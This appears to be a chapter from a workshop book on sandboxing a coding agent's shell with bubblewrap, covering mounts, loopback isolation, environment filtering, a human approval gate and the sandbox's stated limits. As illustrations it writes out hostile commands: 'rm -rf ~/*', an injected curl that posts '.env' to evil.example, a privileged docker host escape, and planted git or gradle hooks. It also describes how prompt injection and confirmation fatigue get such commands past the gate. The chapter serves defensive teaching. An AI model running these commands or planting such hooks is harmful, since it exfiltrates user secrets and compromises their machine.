# The shell and its cage

[pikuri's book](https://codeberg.org/mvysny/pikuri/src/branch/master/book/README.md) built
assistants that are safe because of what they *lack*. A research agent with no file tools
can't leak your files, and a mail agent with no network can't send your mail anywhere. This
book starts with the tool that breaks that recipe: **a shell**.

A shell can do anything you can do. That is the whole point: it runs your build, your tests,
`git`, the package manager, the one-off `jq` pipeline nobody wrote a tool for. It is also the
whole problem, because the command it runs was drafted by the model. Even when it invokes your
own tooling (`./gradlew test`, `bundle exec rspec`), *the model* chose to run that, with those
arguments, possibly after reading instructions in a file it didn't write. It could just as
easily run `rm -rf ~/*`, by injection or by honest mistake.

You can't make a shell safe by leaving something out of it; there is nothing to leave out.
So it gets a **cage**: something outside the model, enforced by the kernel, that decides what
the shell can see and touch. This chapter builds that cage, shows the human gate in front of
it, and is honest about where both stop.

The agent you run here is `pikuri-code`, the workshop's coding agent, in its barest form. The
chapters that follow bolt things onto it (skills, MCP servers, a language server, a task
list), and [the last chapter](code.md) puts it all together. Here you meet just the shell, the
file tools beside it, and the cage.

## Prerequisites

pikuri's [first-conversation](https://codeberg.org/mvysny/pikuri/src/branch/master/book/chat.md),
[sub-agents](https://codeberg.org/mvysny/pikuri/src/branch/master/book/subagents.md) and
[security](https://codeberg.org/mvysny/pikuri/src/branch/master/book/security.md) chapters.
`llama-server` running, `bundle install` done in the workshop checkout. Plus:

- **`bubblewrap`** (`bwrap`), the cage. On Debian / Ubuntu: `sudo apt install bubblewrap`.
  `pikuri-code` fails loudly at boot if `bwrap` is missing or your kernel won't give it user
  namespaces, rather than quietly running without a cage. Skipping the cage is a flag you pass
  on purpose: `--no-sandbox`.
- **`pasta`**, which gives the cage a loopback of its own (below). On Debian / Ubuntu:
  `sudo apt install passt`; rootless podman already pulled it in. Without it the cage still
  runs, and the banner tells you what that leaves open.
- **Linux 5.11 or newer**, for one sandbox feature (overlays, below). Older kernels still work,
  with a logged warning and a narrower sandbox.
- **A throwaway directory**, with `git init` in it so the agent treats it as a project:

  ```sh
  mkdir ~/pikuri-playground && cd ~/pikuri-playground && git init
  ```

  Don't point this chapter's agent at anything you'd mind losing.

## Run it

```sh
~/path/to/pikuri-workshop/pikuri-code/bin/pikuri-code
```

Before the prompt, it asks two questions. *"Does this project hold anything you would mind
leaking?"* sets one line of the trifecta report it prints next; say no for the playground.
*"Trust this directory's git config?"* is about `git`, and this chapter explains it near the
end; say yes, it's your own fresh repo.

Then comes the trifecta report from
[pikuri's trifecta chapter](https://codeberg.org/mvysny/pikuri/src/branch/master/book/trifecta-detector.md):

```
Trifecta: pikuri-code — 2 of 3 legs (untrusted, egress); no private leg found.

pikuri-code [:untrusted_hard, :egress]
  read [:untrusted_hard]
  grep [:untrusted_hard]
  glob [:untrusted_hard]
  file_list [:untrusted_hard]
  edit []
  write []
  calculator []
  bash [:untrusted_hard, :egress]
  ...
```

The first eight lines are this chapter: the four file-reading tools, `edit` and `write`, and
`bash`. The rest of the list belongs to later chapters: the plan-mode tools, the `task_*`
tools, two sub-agents (`file_miner`, `researcher`) you met in pikuri's book, and a third,
`git_repo_research`, that [the coding agent chapter](code.md#sub-agents-untrusted-bytes-away-from-the-shell)
covers. A `skill` tool, an `lsp` tool and MCP tools appear only when you have something
for them: skills in `~/.claude/skills`, a language server in your config. An empty playground
brings none of its own.

Now ask for something:

```
> Write a small Ruby script hello.rb that prints "hi, $USER", and run it.
```

What you should see:

1. The agent calls `write` to create `hello.rb`, and **nothing asks you**. Creating a new file
   inside the project goes through without a prompt; why that's safe is a section below.
2. The agent calls `bash` with `ruby hello.rb`, and this time it stops:

   ```
   OK to run bash: Run the script
   $ ruby hello.rb
   [y] approve  [n] reject  [r] redirect
   ```

   Type `y`.
3. The script runs *inside the cage*, prints `hi, …`, and the agent reports back.

Now ask it to look somewhere it shouldn't:

```
> Show me what's in ~/.ssh.
```

The agent runs `ls ~/.ssh` without asking you (that's the passive-command detector, near the
end of this chapter), and gets back `No such file or directory`. Your `~/.ssh` exists; inside
the cage, it doesn't. The rest of the chapter is how.

## Two views of one disk

The agent reaches your files two ways, and each has its own gatekeeper:

- **The file tools** (`read`, `grep`, `glob`, `file_list`, `edit`, `write`) run inside
  pikuri's own Ruby process, on your host. Every path the model hands them goes through a
  `Workspace::Filesystem` first, which resolves it and refuses anything outside the allowed
  roots: `..`-escapes, a symlink pointing out, an absolute path elsewhere.
- **`bash`** runs a subprocess, and pikuri can't see which files a shell command will touch;
  `cat $(ls | head -1)` names no path at all. So the subprocess runs inside a `Sandbox`,
  which decides what filesystem the command *sees*.

They overlap (both must see the project and your toolchains), but they are not the same list.
`curl` inside the shell needs `/etc/resolv.conf` to resolve a host name and `/sbin` for the
system utilities; the model has no business `read`ing either. Two lists, each kept by the
object that needs it.

Here is the file-tools side, as `bin/pikuri-code` builds it (lightly trimmed):

```ruby
scratch = Pikuri::Paths.new_temp
filesystem = Pikuri::Workspace::Filesystem.new(
  project_root: project_root,
  readable:     Pikuri::Code::ToolchainPaths.readable + skill_catalog.roots + extra_readable,
  writable:     extra_writable + [scratch]
)
filesystem = Pikuri::Code::TmpAlias.new(filesystem, tmp: scratch) if sandbox_enabled
```

- **`project_root`** is the one anchor: readable and writable, the base for relative paths,
  the directory every `bash` command starts in. The bin finds it by climbing from where you
  launched to the nearest `.git` (or `.hg` / `.svn`) and `chdir`s there, so the process and
  the workspace agree. There is no separate "current directory" for the model to reason about.
- **`readable`** adds roots the model can read but not write: `/usr` and `/opt`, version
  managers (`~/.rbenv`, mise, `~/.pyenv`, …) and dependency caches (`~/.m2/repository`,
  `~/.gradle/caches`, `~/.cargo/registry`, …). That's what lets the model `grep` the Ruby
  standard library or read a dependency's source. `--readable PATH` adds one, e.g. a local gem
  your `Gemfile` points at.
- **`writable`** adds more writable roots. `--writable PATH` adds one, with the same blast
  radius as the project. The bin always adds one of its own: **`scratch`**, a directory under
  pikuri's cache, deleted at exit, for downloads and unpacked junk.
- **`Code::TmpAlias`** goes with it when the cage is on: inside the cage that scratch directory
  *is* `/tmp`, so the file tools rewrite `/tmp/foo` to the same place. The model writes
  `/tmp/foo` with `bash`, reads it back with `read`, and both mean the same file. The cage
  learns the scratch directory from the same object, so the two can't disagree.

One more piece sits on top: the file tools share a **read record**. `edit`, and a `write` that
overwrites an existing file, refuse a path the model hasn't `read` in this conversation. A
change can't land on bytes the model never saw.

## The cage: what `bash` sees

The `bash` tool takes its sandbox in its constructor and passes every command through
`sandbox.wrap(argv)` before spawning it. There are two choices here:

- **`Sandbox::NONE`** passes the command through unchanged. It's the default for
  `Code::Bash.new` (and logs a warning when you take it), and what `--no-sandbox` selects.
- **`Sandbox::Bubblewrap`** prefixes the command with `bwrap` and a list of mounts. It's what
  `pikuri-code` uses unless told otherwise.

[Bubblewrap](https://github.com/containers/bubblewrap) builds a fresh, private view of the
filesystem out of pieces of yours, using the kernel's namespaces. Nothing is visible unless
it's mounted in. `pikuri-code`'s view is built from:

1. **The system basics, read-only:** `/lib`, `/lib64`, `/bin`, `/sbin` for the dynamic linker
   and core utilities, and a short `/etc` allowlist: TLS certificates (`/etc/ssl`,
   `/etc/ca-certificates`, `/etc/pki`), `/etc/resolv.conf`, `/etc/nsswitch.conf`,
   `/etc/hosts`, `/etc/localtime`. Nothing else from `/etc`: no `shadow`, no SSH config, no
   NetworkManager secrets.
2. **A private `/proc` and `/dev`**, so the command can't see your other processes.
3. **`/tmp`**, which is the workspace's scratch directory, so files survive from one `bash`
   call to the next. Your real `/tmp` is never shown.
4. **The writable roots** (the project, `--writable` extras), mounted read-write. Writes here
   are real.
5. **The readable roots** (toolchains, caches), mounted as **overlays**, explained below.

Then it unshares every namespace except the network (`--unshare-all --share-net`), so the
command can't see or signal your processes, and dies with pikuri. Your home directory, apart
from the toolchain directories listed above, simply isn't there. That's why `ls ~/.ssh` said
*No such file or directory*: nothing blocked the read; there was nothing to read.

### Loopback, walled too

"Keeps the network" sounds like the internet, but a shared network namespace shares
*loopback* too, and `127.0.0.1` is where a machine keeps the services that trust anyone local:
a web server's admin API, `adb`, a database, the memory store from a later chapter. Probed from
inside the cage on the box this book was written on, Caddy's admin API answered with its live
configuration, and it takes a request that replaces it.

So with `pasta` installed, `bwrap` runs inside a network namespace of its own, which `pasta`
connects outward. The internet and your LAN work as before; `127.0.0.1` inside is the cage's
own, so a server a command starts is reachable from that same command, and the host's are not.
The `bash` tool's description tells the model so, so a refused `curl localhost:3000` doesn't
read as a dead server. When the agent *should* test against a dev server you run on the host,
name its port in the config file: `sandbox_ports: [3000]`. That is the same deal as
`sandbox_env:`: closed by default, opened by name, by you.

### Overlays: writable toolchains that forget

Why not mount the toolchains read-only? Because build tools write into them. `gem install`
and `bundle install` write inside `~/.rbenv` or wherever your Ruby lives, and a read-only
mount fails them with `EROFS` ("read-only file system").

So each readable root is mounted as an **overlay**: your real directory underneath, read
through, and a per-session scratch layer on top that catches every write. Inside the cage,
`/usr` and `~/.gradle/caches` look fully writable and `gem install` works. Outside, nothing
changed:

```
$ touch /usr/pikuri-was-here && ls -la /usr/pikuri-was-here
-rw-rw-r-- 1 1000 1000 0 Nov 12 20:07 /usr/pikuri-was-here
```

The file exists for the rest of the session, then disappears with the scratch layer. That
matters more than tidiness: a prompt-injected session can't plant
`~/.gradle/init.d/payload.gradle` and have it run the next time *you* run `gradle`, outside
the agent.

Two details keep this honest:

- **Caches are mounted narrowly.** The list holds `~/.gradle/caches`, not `~/.gradle`, and
  `~/.m2/repository`, not `~/.m2`. Since an overlay reads through to your real files, a wider
  mount would put `~/.gradle/gradle.properties` (signing keys, repository tokens),
  `~/.m2/settings.xml` and `~/.cargo/credentials.toml` in view. Version managers like
  `~/.rbenv` are mounted whole, because they hold no credentials.
- **Overlays need Linux 5.11.** On an older kernel the sandbox checks once at boot, logs a
  warning, and mounts toolchains read-only instead. Builds that install into them then fail
  with `EROFS`, which the model sees in the command's output.

### The environment, walled too

Files aren't the only thing a command inherits. Your shell's environment variables travel with
every process you start, and that's where people keep tokens: `export GITHUB_TOKEN=…` in a
`.bashrc`, an `OPENAI_API_KEY` for one script. A cage that hid `~/.aws` but passed on
`AWS_SECRET_ACCESS_KEY` would leave a door beside the wall, one `env | curl …` wide.

**The first wall is yours: keep secrets out of the environment.** pikuri's rule is that the
environment is not a secret store, and for good reason. Everything pikuri starts inherits it:
a language server, an MCP server you didn't put in a container, `bash` with `--no-sandbox`.
None of those has walls, and any process running as you can read pikuri's environment from
`/proc`. Go through what your shell exports, and move each token somewhere with permissions:
pikuri's config file (`chmod 600`), or the tool's own store (`gh auth login`,
`~/.aws/credentials`), which the cage's mounts already hide.

The cage adds a second wall for the one child it guards, because a review misses things. It
builds the environment the way it builds the filesystem: nothing gets in unless it's let in.
A variable passes if it is

- what a shell and a terminal need: `PATH`, `HOME`, `USER`, `LANG`, `LC_*`, `TERM`, …;
- a build tool's options: `MAVEN_OPTS`, `NODE_OPTIONS`, `CC`, `CFLAGS`, …;
- **a path**, such as `JAVA_HOME=/usr/lib/jvm/java-21` or `GOPATH=~/go`. A path tells the
  command nothing the mounts don't already decide: `JAVA_HOME` works because the JDK is
  mounted, and `GOOGLE_APPLICATION_CREDENTIALS=~/key.json` is harmless because the file isn't.
  A token is never a path.

Everything else stays outside, and the banner says what by name:

```
The sandbox withholds 3 environment variable(s) from bash: AWS_SECRET_ACCESS_KEY,
DBUS_SESSION_BUS_ADDRESS, GITHUB_TOKEN. To pass one, list it under sandbox_env: in
~/.pikuri-examples-config.yaml. A secret among them belongs out of your shell's
environment altogether.
```

That list is also your review: a token on it got past the first wall, and the cage only
saved this one child. The model sees the same names (never the values) in the `bash` tool's
description, so when a build fails for want of a variable it can tell you which one. The
wrong guess costs a broken build you can see, not a key you can't. Only this cage filters:
`--no-sandbox` passes the environment whole, since a command that can read
`~/.aws/credentials` gains nothing from a missing variable.

### Two things it refuses to start with

Bubblewrap checks its workspace at construction and raises rather than run a cage that isn't
one:

- **A workspace where `/` is writable**, which is what `--yolo`'s `WholeDisk` workspace is.
  Containment is meaningless when the whole disk is in the box; pass `Sandbox::NONE` and say
  so.
- **A root that exposes a container or VM control socket**, such as `/var/run/docker.sock`,
  containerd, podman, libvirt or LXD. Reaching one of those is one command from root on your
  host (`docker run --privileged -v /:/host …`), whatever else the cage holds.

## The human gate

Every confirmation goes through one object, a `Workspace::Confirmer`. Tools never print or
read from the terminal themselves. They hand the confirmer a `Request` (a one-line question,
plus the detail: the raw command, or a diff) and get back one of three answers:

- **Approved**, carrying the payload to act on. Where a request is editable, you may have
  edited it first: `[e] edit` appears in the prompt.
- **Rejected**, a plain no. It carries no words on purpose: to a model, any text after
  "declined" reads as a hint to work around.
- **Redirected**, carrying what you typed after `r` ("use the other library"). That becomes
  the model's next observation, and if it proposes something new, you're asked again.

The confirmer owns presentation, and that's a security job too. It neutralises control
characters before they reach your terminal, so a command can't use a carriage return to
overwrite itself on screen after you've read it. `Confirmer::Terminal` is the one you saw;
`Confirmer::AUTO_APPROVE` says yes to everything and is what `--no-confirm` selects.

### What `pikuri-code` asks about, and what it doesn't

- **Every `bash` command** asks, unless the passive-command detector proves it read-only
  (next section).
- **Overwriting an existing file with `write`** asks, showing the diff.
- **Creating a new file** doesn't ask. It destroys nothing, and the cage already keeps it
  inside the project.
- **`edit`** doesn't ask, because two guards already pin it down. The read record refuses a
  file the model hasn't read, and an edit names the exact text it replaces (`old_string`),
  which must match byte for byte. The model can't change bytes it hasn't seen. A whole-file
  `write` has no such check, which is why an overwrite asks.

A coding agent writes constantly, so asking about each edit would mostly train you to press
`y`. [The OS-assistant chapter](os-assistant.md) makes the opposite choice for an agent that
rarely writes, and asks about every one.

Notice what approving a `bash` command means. You approve a *program*, not the bytes it will
produce. Behind a pipe, `$(…)` or a script file, the data a command sends out is computed when
it runs and was never on your screen. Approving `curl` approves an intent. Keep that in mind
for the last section.

## Confirmation fatigue: the passive-command detector

"Confirm every command" is right for changes and miserable for the constant harmless looks:
`ls`, `cat`, `wc`, `git status`. And the cost isn't just annoyance. Someone who has pressed
`y` forty times this session has stopped reading, and the forty-first prompt, the injected
one, gets the same `y`. Cutting pointless prompts is security work.

So `bash` consults a second object before the confirmer, `Code::Bash::PassiveCommandDetector`,
which answers one question: *is this command provably read-only?* If yes, it runs without a
prompt; if not, or if it can't tell, you're asked. It is deliberately not a `Confirmer`: it
never talks to anyone, it parses commands, so "how to ask" and "what may skip asking" stay
separate knobs.

A command passes only when every part of it (joined by `|`, `&&`, `;`) is a simple invocation
of a bare program name on a short allowlist: `ls`, `cat`, `head`, `wc`, `grep`, `stat`, `df`,
`du`, `ps`, `which` and similar, plus read-only queries of a few mixed tools like `systemctl`
or `journalctl`. A binary makes the list only if *no* argument turns it into a writer, so
`find` is out (`-delete`), as are `tee`, `dd` and `sed`. Command substitution, redirection to
a file, a path like `./ls` that could point at a planted binary: each one sends the command
to you. Its failure mode is asking too often, never approving a deletion.

```
ls ~/.ssh                   passive
ls -la | grep rb            passive
cat ~/.ssh/id_ed25519       passive
ruby hello.rb               asks
find . -name x              asks
echo hi > x                 asks
cat "$(whoami)"             asks
```

Look at the third line. The detector waves `cat ~/.ssh/id_ed25519` through, and that's fine
**because of the cage**, not because of the detector: inside it, the key doesn't exist. The
detector only grants reads the agent could already do with `read`, and the cage decides what
those are. Take the cage away and that line becomes a quiet key read, which is one reason
`--no-sandbox` comes with a warning.

There's a cheaper lever too: `bash`'s own description tells the model to prefer the file tools
for looking (`read` over `cat`, `glob` over `find`). Those never prompt at all, so `bash`'s
remaining prompts are mostly the changes you want to see.

### Even `git status` runs code

Read-only git (`status`, `diff`, `log`, `show`, `blame`) would be the most useful entry on the
list, and it is the most dangerous. A repository's own `.git/config` can name programs git
runs on everyday commands. The worst is `core.fsmonitor`, which runs on every `git status`.
Clone a hostile repo, let the agent `git status` it, and that program runs as you.

`bash` closes that one for every command, not just passive ones. It passes git settings
through the environment (`GIT_CONFIG_COUNT` / `GIT_CONFIG_KEY_n` / `GIT_CONFIG_VALUE_n`), which
outrank anything in the repo: `core.fsmonitor=false` and `core.pager=cat`. Whatever the repo
says, no monitor runs.

One door stays open, and the environment can't close it: a repo's `.gitattributes` can name a
*diff driver* (`diff.external`, `textconv`), a program `git diff` runs on matching files. With
the network shared, that program can send what it reads anywhere. That's what the boot
question was about: *"Trust this directory's git config?"* Say yes and read-only git skips the
prompt. Say no (the default) and every `git` command asks, like any other. It's asked every
session and never remembered, on purpose. For a repo you genuinely don't trust, the answer is
the last section.

## Where the cage stops

Here is everything this setup does *not* protect:

- **The network is open.** Builds need it: `git fetch`, `bundle install`, `mvn`. Inside the
  cage, `curl https://example.com` gets its `200`. An injected
  `curl -X POST --data @.env https://evil.example` is one approved command away, and the
  prompt is the only thing in its path. Only the host's loopback is cut; your LAN, the LLM
  server included, answers. A per-host allowlist (your registries and your git remote,
  nothing else) is planned, not shipped.
- **The project is inside the radius.** The agent can change anything under the project root:
  the build files, the tests, and `.git/hooks`, which run the next time *you* commit, outside
  any cage. And "leak *this* project's `.env`" works exactly as well as it would without a
  cage. The cage keeps your *machine* out of reach, not the project you handed over.
- **The kernel is shared.** Bubblewrap is namespaces, the same kernel machinery as Docker.
  A kernel bug is a way out, and the kernel is a large thing to trust.
- **It cages `bash`, nothing else.** pikuri's own process, the file tools, and anything else
  it starts (an MCP server, a language server, in later chapters) run as you, outside it.
- **The gate is attention, not isolation.** It works when you read the prompt, and it's worth
  nothing when nobody is watching.

Every one of those is a reason someone reaches for the off switches:

- `--no-sandbox` drops the cage (`Sandbox::NONE`).
- `--no-confirm` drops the gate (`AUTO_APPROVE`).
- `--yolo` drops both and opens the file tools to the whole disk (`Code::WholeDisk`,
  which still refuses a short credential list: `~/.ssh`, `~/.aws`, `~/.gnupg`, …).

With any of them, the banner tells you a layer is off. With `--yolo` on your laptop, the model
has a shell with all your permissions, no human in the loop, and the internet.

**Lifting the cage takes a VM.** Run the whole of `pikuri-code` inside a virtual machine, with
only the project copied or mounted in, and the walls move out to the hypervisor. A VM has its
own kernel, so the shared-kernel problem goes; the VM holds none of your other files, so the
blast radius is the VM; and you can throw it away afterwards. Inside one, `--yolo` is a
reasonable way to work, and an unattended run (no human to answer prompts) belongs nowhere
else. The workshop doesn't ship a VM: one cage that says plainly where it stops beats two, and
a VM needs your whole toolchain inside it, which only you can set up. Nothing stops you
running without one, either; the banner asks `systemd-detect-virt`, and outside a VM it says so
in red.

## What's next

[The OS assistant](os-assistant.md) takes the same parts (the file tools, `bash`, the gate,
the detector) and makes the opposite cut. Its whole job is your machine, so it gets the
*whole* disk, and the kernel severs the network instead. Its point is your host, not a VM, so
that cage is the one you keep on.
